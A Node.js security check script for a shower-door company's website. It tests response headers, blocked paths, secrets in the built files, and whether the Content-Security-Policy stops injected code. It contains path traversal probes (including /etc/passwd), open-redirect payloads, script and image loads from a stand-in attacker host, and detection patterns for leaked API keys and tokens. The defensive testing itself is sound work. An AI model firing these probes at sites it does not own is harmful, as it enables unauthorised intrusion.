// Security checks against a running site: node scripts/security-check.mjs http://127.0.0.1:8787/   (after `npm run build`)
// A. headers on every kind of response   B. files and paths that must never be reachable   C. what is inside the built site
// D. in a real browser: the Content-Security-Policy blocks injected scripts, and nothing of ours is blocked.
import { chromium } from '/opt/node22/lib/node_modules/playwright/index.mjs'
import { request as httpRequest } from 'node:http'
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { createHash } from 'node:crypto'
import { join, dirname, extname } from 'node:path'
import { fileURLToPath } from 'node:url'

const url = (process.argv[2] || 'http://127.0.0.1:8787/').replace(/\/?$/, '/')
const root = join(dirname(fileURLToPath(import.meta.url)), '..')
const dist = join(root, 'dist')
const host = new URL(url)

let problems = 0
let checks = 0
const check = (ok, msg) => {
  checks++
  if (!ok) {
    problems++
    console.log(`FAIL ${msg}`)
  }
}
const section = (t) => console.log(`\n${t}`)
const walk = (d) => readdirSync(d).flatMap((n) => (statSync(join(d, n)).isDirectory() ? walk(join(d, n)) : [join(d, n)]))

// A request with the path exactly as written (fetch would tidy "../" away before sending it).
const raw = (path, method = 'GET') =>
  new Promise((resolve) => {
    const req = httpRequest({ host: host.hostname, port: host.port, path, method, headers: { accept: 'text/html' } }, (res) => {
      res.resume()
      res.on('end', () => resolve({ status: res.statusCode, location: res.headers.location || '' }))
    })
    req.on('error', (e) => resolve({ status: 0, error: String(e) }))
    req.end()
  })

// ================================================================================================================
section('A. Headers')
const sitemap = await (await fetch(`${url}sitemap.xml`)).text()
const pagePaths = [...sitemap.matchAll(/<loc>[^<]*?\/\/[^/]+(\/[^<]*)<\/loc>/g)].map((m) => m[1])
const kinds = ['/', '/products/', '/products/sliding-shower-doors/', '/products/neo-angle-shower-enclosures/d15131/', '/products/sliding-shower-doors/dlfc04/', '/factory/', '/projects/', '/contact/', '/faq/', '/thank-you/', '/does-not-exist/', '/robots.txt', '/sitemap.xml', '/llms.txt', '/favicon.svg']
const homeHtml = await (await fetch(url)).text()
const asset = homeHtml.match(/\/_astro\/[^"' )]+\.(css|js|woff2)/)?.[0]
const required = {
  'x-content-type-options': /^nosniff$/i,
  'referrer-policy': /strict-origin/,
  'x-frame-options': /^DENY$/i,
  'permissions-policy': /camera=\(\)/,
  'strict-transport-security': /max-age=\d{7,}/,
  'cross-origin-opener-policy': /same-origin/,
  'content-security-policy': /default-src 'self'/,
}
for (const p of [...kinds, ...(asset ? [asset] : [])]) {
  const res = await fetch(url.slice(0, -1) + p)
  for (const [h, re] of Object.entries(required)) check(re.test(res.headers.get(h) || ''), `${p}: header ${h} missing or wrong (${res.headers.get(h)})`)
  check(!res.headers.has('set-cookie'), `${p}: sets a cookie`)
  check(!res.headers.has('x-powered-by'), `${p}: announces its software`)
}
if (asset) check(/immutable/.test((await fetch(url.slice(0, -1) + asset)).headers.get('cache-control') || ''), `${asset}: hashed files should be cached for good`)

const csp = Object.fromEntries(((await fetch(url)).headers.get('content-security-policy') || '').split(';').map((d) => d.trim().split(/\s+/)).filter((d) => d[0]).map(([k, ...v]) => [k, v]))
check(!csp['script-src']?.includes("'unsafe-inline'") && !csp['script-src']?.includes("'unsafe-eval'"), 'script-src allows unsafe-inline or unsafe-eval')
check(!Object.values(csp).flat().some((v) => v === '*' || v === 'https:' || v === 'http:' || v === 'data:' && false), 'a wildcard source in the policy')
check(csp['object-src']?.[0] === "'none'" && csp['frame-ancestors']?.[0] === "'none'" && csp['base-uri']?.[0] === "'self'" && csp['form-action']?.[0] === "'self'", 'object-src, frame-ancestors, base-uri and form-action must be locked down')
check((csp['script-src'] || []).filter((v) => v.startsWith('https:')).every((v) => /challenges\.cloudflare\.com|static\.cloudflareinsights\.com/.test(v)), 'script-src allows an unexpected outside host')
{
  // Every inline script on every page must be one the policy lists, or the browser would refuse our own code.
  let seen = 0
  for (const p of pagePaths) {
    const html = await (await fetch(url.slice(0, -1) + p)).text()
    for (const [, attrs, body] of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/g)) {
      const type = attrs.match(/\btype="([^"]*)"/)?.[1]
      if (/\bsrc=/.test(attrs) || (type && type !== 'module' && type !== 'speculationrules')) continue
      seen++
      check((csp['script-src'] || []).includes(`'sha256-${createHash('sha256').update(body).digest('base64')}'`), `${p}: an inline script is not listed in the policy`)
    }
  }
  console.log(`     ${seen} inline scripts on ${pagePaths.length} pages, all listed in the policy`)
}
{
  const api = await fetch(`${url}api/inquiry`, { method: 'POST', headers: { 'content-type': 'application/json', accept: 'application/json' }, body: '{}' })
  check(/no-store/.test(api.headers.get('cache-control') || '') && api.headers.get('x-content-type-options') === 'nosniff', 'the inquiry address must send no-store and nosniff')
  check(!api.headers.has('access-control-allow-origin'), 'the inquiry address must not allow other websites to read its answers (no CORS)')
  const pre = await fetch(`${url}api/inquiry`, { method: 'OPTIONS', headers: { origin: 'https://evil.example', 'access-control-request-method': 'POST' } })
  check(!pre.headers.has('access-control-allow-origin') && pre.status === 405, 'a cross-site pre-flight request must be refused')
}

// ================================================================================================================
section('B. Files and paths that must not be reachable')
const hidden = ['/.env', '/.dev.vars', '/.git/config', '/.git/HEAD', '/wrangler.jsonc', '/package.json', '/package-lock.json', '/worker/index.js', '/worker/db.js', '/migrations/0001_inquiries.sql',
  '/src/data/catalog.ts', '/src/pages/index.astro', '/astro.config.mjs', '/scripts/finish-headers.mjs', '/node_modules/astro/package.json', '/docs/HANDOFF.md', '/docs/', '/AGENTS.md', '/CLAUDE.md',
  '/client-materials/', '/private-materials/', '/_headers', '/_redirects', '/dist/index.html', '/index.html.map', '/_astro/index.js.map', '/server.mjs', '/.well-known/../package.json']
for (const p of hidden) {
  const r = await raw(p)
  check(r.status === 404 || (r.status >= 300 && r.status < 400 && !/^(https?:)?\/\//.test(r.location) && !/package|\.env|git/.test(r.location)), `${p} should not be served (status ${r.status} ${r.location})`)
}
for (const p of ['/..%2f..%2fpackage.json', '/%2e%2e/package.json', '/%2e%2e%2fwrangler.jsonc', '/_astro/../../package.json', '/api/../package.json', '/products/..%5c..%5cpackage.json', '/%00', '/products/%00.html', '/.%2e/.%2e/etc/passwd', '/..;/package.json']) {
  const r = await raw(p)
  check(r.status !== 0 && r.status < 500 && r.status !== 200, `traversal ${p} should be refused (status ${r.status})`)
}
for (const p of ['//evil.example/', '/\\evil.example', '///evil.example', '/products//evil.example', '/%2F%2Fevil.example', '/https://evil.example', '//evil.example/%2e%2e', '/%5Cevil.example']) {
  const r = await raw(p)
  // Leading to another page ON our site is fine; leading to another website is not.
  const leaves = r.location && new URL(r.location, url).origin !== host.origin
  check(!leaves, `open redirect via ${p} (to ${r.location})`)
  check(r.status !== 0 && r.status < 500, `${p} answered with ${r.status}`)
}
for (const m of ['POST', 'PUT', 'DELETE', 'PATCH']) {
  const r = await raw('/', m)
  check(r.status > 0 && r.status < 500, `${m} / answered with ${r.status}`)
}
{
  const r = await raw(`/${'a'.repeat(12000)}`)
  check(r.status !== 0 && r.status < 500, `a 12,000 character address answered with ${r.status}`)
  const old = await raw('/products')
  check(old.status >= 300 && old.status < 400 && /\/products\/$/.test(old.location), `/products should lead to /products/ (status ${old.status} ${old.location})`)
}

// ================================================================================================================
section('C. What is inside the built site')
const siteTs = readFileSync(join(root, 'src/data/site.ts'), 'utf8')
// Example texts shown in the form (not real people): the email in the error message, and a UK number from the range reserved for TV dramas.
const configured = [...siteTs.matchAll(/(?:email|whatsapp|phone):\s*'([^']+)'/g)].map((m) => m[1]), examples = ['name@company.com', '+44 7700 900123']
configured.push(...examples)
const files = walk(dist)
const allowedExt = new Set(['.html', '.css', '.js', '.txt', '.xml', '.svg', '.png', '.jpg', '.jpeg', '.webp', '.avif', '.woff2', '.ico', '.json', '.webmanifest', ''])
for (const f of files) {
  const name = f.slice(dist.length + 1)
  check(allowedExt.has(extname(f).toLowerCase()) || /^_(headers|redirects)$/.test(name), `unexpected file type in the site: ${name}`)
  check(!/\.map$|\.env|\.DS_Store|Thumbs\.db|\.py$|\.mjs$|\.ts$|\.md$/.test(name), `a file that should not be published: ${name}`)
}
const textFiles = files.filter((f) => /\.(html|js|css|txt|xml|svg|json)$/.test(f))
const forbidden = [/fuli/i, /fanly/i, /merlyn/i, /guxbai/i, /福立/, /client-materials/i, /private-materials/i, /drive\.google\.com/i, /docs\.google\.com/i, /\bAKIA[0-9A-Z]{16}\b/, /\bre_[A-Za-z0-9]{20,}/, /gh[pousr]_[A-Za-z0-9]{30,}/, /-----BEGIN [A-Z ]*PRIVATE KEY-----/, /api[_-]?key["']?\s*[:=]\s*["'][A-Za-z0-9_-]{16,}/i, /TURNSTILE_SECRET|RESEND_API_KEY|CLOUDFLARE_API_TOKEN/]
const hosts = new Map()
for (const f of textFiles) {
  const t = readFileSync(f, 'utf8')
  const name = f.slice(dist.length + 1)
  for (const re of forbidden) check(!re.test(t), `${name}: contains ${re}`)
  for (const [, h] of t.matchAll(/https?:\/\/([a-zA-Z0-9.-]+)/g)) hosts.set(h, (hosts.get(h) || 0) + 1)
  if (name.endsWith('.html') || name.endsWith('.txt')) {
    for (const [e] of t.matchAll(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[a-z]{2,}/gi)) check(configured.includes(e) || /@example\.(com|org)$/.test(e), `${name}: an email address that is not in site.ts: ${e}`)
    for (const [ph] of t.matchAll(/(?:\+|\b00)\d{1,3}[\s.-]?\(?\d{2,4}\)?[\s.-]?\d{3,4}[\s.-]?\d{3,4}/g)) check(configured.some((c) => c.replace(/\D/g, '').includes(ph.replace(/\D/g, ''))), `${name}: a phone number that is not in site.ts: ${ph}`)
    for (const [a] of t.matchAll(/<a\b[^>]*target="_blank"[^>]*>/g)) check(/noopener/.test(a), `${name}: a new-tab link without noopener`)
    check(!/javascript:/i.test(t), `${name}: a javascript: link`)
  }
  if (name.endsWith('.js') || name.endsWith('.html')) {
    check(!/\beval\s*\(|new Function\s*\(|document\.write\s*\(/.test(t.replace(/<script type="application\/ld\+json">[\s\S]*?<\/script>/g, '')), `${name}: uses eval, new Function or document.write`)
  }
}
const allowedHosts = ['schema.org', 'www.sitemaps.org', 'www.w3.org', 'challenges.cloudflare.com', 'static.cloudflareinsights.com', 'cloudflareinsights.com', host.hostname, 'localhost', 'wa.me']
for (const h of hosts.keys()) check(allowedHosts.includes(h) || [...allowedHosts].some((a) => h.endsWith(`.${a}`)) || configured.some((c) => c.includes(h)), `an outside address the site talks to: ${h}`)
{
  const forms = [...homeHtml.matchAll(/<form\b[^>]*>/g)].map((m) => m[0])
  check(forms.length > 0 && forms.every((f) => /method="post"/i.test(f) && /action="\/api\/inquiry"/.test(f)), `the inquiry form must post to /api/inquiry: ${forms.join(' ')}`)
  check(!/type="password"/.test(homeHtml), 'a password field on the home page')
}
console.log(`     ${files.length} published files, talks to: ${[...hosts.keys()].join(', ')}`)

// ================================================================================================================
section('D. In a real browser')
const proxy = process.env.HTTPS_PROXY ? { server: process.env.HTTPS_PROXY, bypass: '127.0.0.1,localhost' } : undefined
const launchArgs = process.env.SPKI_PIN ? [`--ignore-certificate-errors-spki-list=${process.env.SPKI_PIN}`] : []
const browser = await chromium.launch({ proxy, args: launchArgs })
const violations = []
const watch = async (ctx) => {
  await ctx.addInitScript(() => {
    window.__csp = []
    document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`))
  })
}
const scroll = async (page) => {
  for (let i = 0; i < 14; i++) {
    await page.mouse.wheel(0, 700)
    await page.waitForTimeout(40)
  }
}
for (const [label, vp] of [['desktop', { width: 1440, height: 900 }], ['phone', { width: 390, height: 844 }]]) {
  const ctx = await browser.newContext({ viewport: vp, hasTouch: label === 'phone', isMobile: label === 'phone' })
  await watch(ctx)
  const page = await ctx.newPage()
  const seen = []
  page.on('console', (m) => m.type() === 'error' && /Content Security Policy|Refused to/i.test(m.text()) && seen.push(m.text().slice(0, 200)))
  page.on('pageerror', (e) => seen.push(`page error: ${e.message.slice(0, 150)}`))
  const collect = async (what) => {
    const v = await page.evaluate(() => window.__csp || []).catch(() => [])
    for (const x of v) violations.push(`${label} ${what}: ${x}`)
  }
  for (const p of ['', 'products/', 'products/sliding-shower-doors/', 'products/sliding-shower-doors/dlfc04/', 'products/neo-angle-shower-enclosures/d15131/', 'factory/', 'projects/', 'contact/', 'faq/']) {
    await page.goto(url + p, { waitUntil: 'load' })
    await scroll(page)
    if (label === 'phone') {
      await page.click('.bar > .menu-button').catch(() => {})
      await page.waitForTimeout(250)
      await page.keyboard.press('Escape')
    }
    if (await page.$('.swatch')) await page.click('.swatch >> nth=1').catch(() => {})
    await page.focus('form[name="inquiry"] input[name="name"]').catch(() => {}) // wakes the spam check
    await page.waitForTimeout(500)
    await collect(`/${p}`)
  }
  // Moving between pages: the picture transition and the page preparation must not be blocked either.
  await page.goto(`${url}products/`, { waitUntil: 'load' })
  await page.locator('.card').first().hover()
  await page.waitForTimeout(800)
  await page.locator('.card').first().click()
  await page.waitForLoadState('load')
  await page.waitForTimeout(600)
  await collect('opening a product')
  // The spam check script must load under the policy.
  await page.goto(`${url}contact/`, { waitUntil: 'load' })
  await page.focus('form[name="inquiry"] input[name="name"]')
  const loaded = await page.waitForFunction(() => typeof window.turnstile !== 'undefined', null, { timeout: 15000 }).then(() => true, () => false)
  check(loaded, `${label}: the spam check script (Turnstile) did not load under the policy`)
  await collect('contact form')
  for (const s of seen) violations.push(`${label}: ${s}`)

  if (label === 'desktop') {
    // Proof the policy works: things an attacker would try are refused.
    await page.goto(`${url}contact/`, { waitUntil: 'load' })
    const r = await page.evaluate(async () => {
      const out = {}
      const s = document.createElement('script')
      s.textContent = 'window.__pwned = 1'
      document.body.append(s)
      out.inlineScript = window.__pwned === 1 ? 'RAN' : 'blocked'
      const b = document.createElement('button')
      b.setAttribute('onclick', 'window.__pwned2 = 1')
      document.body.append(b)
      b.click()
      out.inlineHandler = window.__pwned2 === 1 ? 'RAN' : 'blocked'
      // Code built from a string (eval and friends). The test tool is exempt from the policy for its own code, so the page
      // is asked to do it later with a string timer, which the policy does judge.
      window.setTimeout('window.__evalRan = 1', 0)
      await new Promise((res) => setTimeout(res, 300))
      out.evalResult = window.__evalRan === 1 ? 'RAN' : 'blocked'
      out.evalReported = window.__csp.some((v) => /^script-src eval/.test(v))
      const ext = document.createElement('script')
      ext.src = 'https://evil.example/x.js'
      const loadedExternal = await new Promise((res) => { ext.onload = () => res('LOADED'); ext.onerror = () => res('blocked'); document.head.append(ext); setTimeout(() => res('blocked'), 3000) })
      out.externalScript = loadedExternal
      const img = document.createElement('img')
      img.src = 'https://evil.example/pixel.gif'
      out.externalImage = await new Promise((res) => { img.onload = () => res('LOADED'); img.onerror = () => res('blocked'); document.body.append(img); setTimeout(() => res('blocked'), 3000) })
      out.violations = window.__csp.length
      return out
    })
    check(r.inlineScript === 'blocked', 'an injected inline script ran')
    check(r.inlineHandler === 'blocked', 'an injected onclick handler ran')
    check(r.evalResult === 'blocked' && r.evalReported, `code built from a string ran or was not reported (${r.evalResult}, reported: ${r.evalReported})`)
    check(r.externalScript === 'blocked', 'a script from another website loaded')
    check(r.externalImage === 'blocked', 'an image from another website loaded (data could be sent out through it)')
    check(r.violations >= 4, `the browser reported only ${r.violations} blocked attempts`)
    console.log(`     injected inline script: ${r.inlineScript}; onclick handler: ${r.inlineHandler}; code from a string: ${r.evalResult}; script from another site: ${r.externalScript}; image from another site: ${r.externalImage}`)
    // The site cannot be put inside another site's page (clickjacking).
    const framer = await ctx.newPage()
    await framer.goto('about:blank')
    await framer.setContent(`<iframe id="f" src="${url}" width="600" height="400"></iframe>`)
    await framer.waitForTimeout(2500)
    const child = framer.frames().find((f) => f !== framer.mainFrame())
    check(!child || !child.url().startsWith(url) || (await child.title().catch(() => '')) === '', 'the site could be shown inside another page')
    const shown = await framer.evaluate(() => { try { return document.getElementById('f').contentDocument === null ? 'cross-origin (not readable)' : 'readable' } catch { return 'blocked' } })
    console.log(`     shown inside another page: ${child && child.url().startsWith('chrome-error') ? 'refused by the browser' : child?.url() || 'refused'} (${shown})`)
    await framer.close()
  }
  await ctx.close()
}
check(violations.length === 0, `blocked by our own policy (the site would be broken):\n       ${violations.join('\n       ')}`)
console.log(`     ${violations.length === 0 ? 'no script, style, image, font or connection of ours was blocked on any page, on desktop or phone' : violations.length + ' blocked'}`)
await browser.close()

console.log(problems ? `\n${problems} problem(s) in ${checks} checks` : `\nAll security checks passed (${checks} checks)`)
process.exit(problems ? 1 : 0)
